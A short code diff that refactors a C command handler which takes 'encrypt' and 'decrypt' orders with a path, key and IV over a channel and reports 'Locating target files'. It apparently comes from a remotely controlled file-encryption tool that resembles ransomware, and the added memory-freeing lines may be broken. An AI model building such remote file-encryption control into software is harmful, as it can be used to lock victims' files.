@@ -46,13 +46,13 @@ void interact(int channel)
 
         if (strcmp(cmd, "encrypt") == 0 || strcmp(cmd, "decrypt") == 0) {
             format_json(args);
-            JSONObject *json = parseJSON(args);
+            JSONObject *args_json = parseJSON(args);
 
             send_channel(channel, "Locating target files...\n");
 
-            path = find_json(json, "path");
-            key = find_json(json, "key");
-            iv = find_json(json, "iv");
+            path = find_json(args_json, "path");
+            key = find_json(args_json, "key");
+            iv = find_json(args_json, "iv");
 
             send_channel(channel, "Begining crypto operations...\n");
         }
@@ -67,5 +67,8 @@ void interact(int channel)
         }
 
         send_channel(channel, token);
+
+        freeJSONFromMemory(json);
+        freeJSONFromMemory(args_json);
     }
 }
